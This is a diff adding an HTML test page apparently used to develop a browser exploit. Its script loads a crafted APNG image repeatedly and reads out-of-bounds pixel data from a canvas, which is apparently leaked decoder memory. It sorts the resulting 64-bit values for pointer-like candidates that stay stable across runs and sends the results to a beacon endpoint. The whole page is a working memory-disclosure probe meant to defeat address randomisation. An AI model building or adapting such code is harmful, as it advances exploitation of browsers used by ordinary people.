@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V953B</title></head>
+<body><pre id="out">V953B — APNG OOB pointer-heuristic harvest (B, hypothesis)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V953B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+Date.now()+'_'+n+'_'+Math.random(); }); }
+// heuristic: 64-bit qword (hex string, 16 chars, little-endian pixel pair as we emit lo+hi)
+// flag as "ptr-like" if it looks like canonical-ish 48-bit user-space pattern often seen as pointers:
+// - not all-zero, not filler aeaeaeafaeaeaeaf, not obvious small int
+// - when interpreted as little-endian 64-bit, high 16 bits are 0x0000 or 0xffff? (we don't have BigInt math reliably; do string heuristic)
+// We report raw qwords and simple flags; stability checked across iters.
+function isFiller(q){ return q==='aeaeaeafaeaeaeaf'||q==='aeaeaeafaeaeaee5'||q==='0000000000000000'; }
+function isGreenOrRed(lo){ return lo==='00ff00ff'||lo==='ff0000ff'; }
+function ptrLike(q){
+  if(isFiller(q)) return false;
+  // q = lo(8 hex, bytes as RGBA) + hi(8 hex) in our p32 concat per pixel; interpret as 64-bit little-endian by bytes order emitted
+  // crude: check high byte patterns in hi part (chars 14,15 = last byte of hi pixel in our hex) / overall shape
+  // also flag values with 0000xxxx or xxxx0000 forms in halves that recur as pointers? keep broad but report.
+  var hi = q.slice(8);
+  // canonical user ptr upper bits often 00 00 7f / 00 00 00 00 01? too specific; flag any where hi half not 00000000/aeaeaeaf/ffffffff trivially and has variation
+  if(hi==='00000000'||hi==='aeaeaeaf'||hi==='ffffffff') return false;
+  return true; // "interesting/non-filler/non-trivial-high" - heuristic bucket
+}
+async function run(){
+  bk('BOOT','heuristic harvest 321753 OOB qwords (f128_fr16) x12; STOP if no stable ptr-like candidate');
+  var fullW=128, fullH=64, frW=16;
+  var counts={}, ptrCounts={}, samples=[];
+  for(var it=0;it<12;it++){
+    try{
+      var im=await loadImg('v946b_f128_fr16.apng',it);
+      var c=document.createElement('canvas'); c.width=fullW; c.height=fullH;
+      var ctx=c.getContext('2d'); ctx.clearRect(0,0,fullW,fullH); ctx.drawImage(im,0,0);
+      var d=ctx.getImageData(0,0,fullW,fullH).data;
+      var rows=[0,1,2,3,15], rowQs=[];
+      for(var ri=0;ri<rows.length;ri++){
+        var y=rows[ri];
+        for(var x=frW;x<=Math.min(fullW-4,frW+10);x+=2){
+          var lo=p32(d,fullW,x,y), hi=p32(d,fullW,x+1,y), q=lo+hi;
+          if(isGreenOrRed(lo)) continue;
+          counts[q]=(counts[q]||0)+1;
+          if(ptrLike(q)) { ptrCounts[q]=(ptrCounts[q]||0)+1; if(samples.length<12) samples.push('i'+it+'y'+y+'x'+x+'='+q); }
+          if(rowQs.length<4) rowQs.push(q);
+        }
+      }
+      bk('IT','i='+it+'|s='+rowQs.join(','));
+    }catch(e){ bk('IT-ERR','i='+it+'|'+String(e&&e.message||e).slice(0,120)); }
+  }
+  function top(map,n){ return Object.keys(map).sort(function(a,b){return map[b]-map[a];}).slice(0,n).map(function(k){return k+':'+map[k];}).join(','); }
+  var stable=Object.keys(ptrCounts).filter(function(k){return ptrCounts[k]>=3;});
+  bk('TOP', 'all='+top(counts,8));
+  bk('PTR', 'ptrLike='+Object.keys(ptrCounts).length+'|stable(>=3)='+stable.length+'|top='+top(ptrCounts,8));
+  bk('SAMP', samples.join('|'));
+  bk('TOTAL','ptrLikeKeys='+Object.keys(ptrCounts).length+'|stable='+stable.length+'|verdict='+(stable.length?'INVESTIGATE':'no-stable-ptr-heuristic'));
+  bk('DONE','complete');
+  say('ptrLike='+Object.keys(ptrCounts).length+' stable='+stable.length);
+}
+run().catch(function(e){ bk('FATAL',String(e&&e.message||e).slice(0,160)); say('fatal '+e); });
+</script>
+</body></html>
